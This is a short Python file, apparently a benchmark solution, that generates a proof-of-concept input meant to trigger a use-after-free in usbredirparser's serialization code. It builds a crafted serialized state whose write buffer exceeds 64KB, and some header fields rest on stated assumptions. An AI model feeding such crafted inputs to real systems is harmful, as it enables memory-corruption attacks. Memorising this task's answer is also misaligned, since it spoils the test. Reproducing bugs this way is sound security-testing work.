import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability exists in usbredirparser_serialize when the write buffer 
        # exceeds the default serialization buffer size (64KB), triggering a reallocation 
        # and a Use-After-Free on the write_buf_count pointer.
        # We construct a serialized state that mimics a valid parser state with 
        # a write buffer larger than 64KB.

        # Header Structure (Little Endian):
        # 1. Magic (uint32) - 0x00000000 (USBREDIRPARSER_SERIALIZE_MAGIC)
        # 2. Flags (uint32)
        # 3. Peer Capabilities (uint32 * 4) - USBREDIR_CAPS_SIZE assumed 4
        # 4. Device Info (5 * uint32) - Vendor, Product, Class, Subclass, Protocol
        # 5. Interface Count (uint8)
        # 6. Configuration (uint8)
        # 7. Interface (uint8)
        # 8. Alt Setting (uint8)
        # 9. Write Buffer Count (uint32)
        # 10. Write Buffers (Length + Data)
        # 11. Free Write Buffer Count (uint32)

        poc = bytearray()

        # Magic and Flags
        poc.extend(struct.pack('<II', 0, 0))

        # Peer Capabilities (16 bytes of zeros)
        poc.extend(b'\x00' * 16)

        # Device Info (20 bytes of zeros)
        poc.extend(b'\x00' * 20)

        # Interface Count, Config, Interface, Alt Setting (4 bytes of zeros)
        poc.extend(struct.pack('BBBB', 0, 0, 0, 0))

        # Write Buffer Count: 1
        poc.extend(struct.pack('<I', 1))

        # Write Buffer 1
        # Length must exceed 65536 (64KB) to trigger reallocation logic
        # Using 70000 bytes
        buf_len = 70000
        poc.extend(struct.pack('<I', buf_len))
        poc.extend(b'A' * buf_len)

        # Free Write Buffer Count: 0
        poc.extend(struct.pack('<I', 0))

        return bytes(poc)
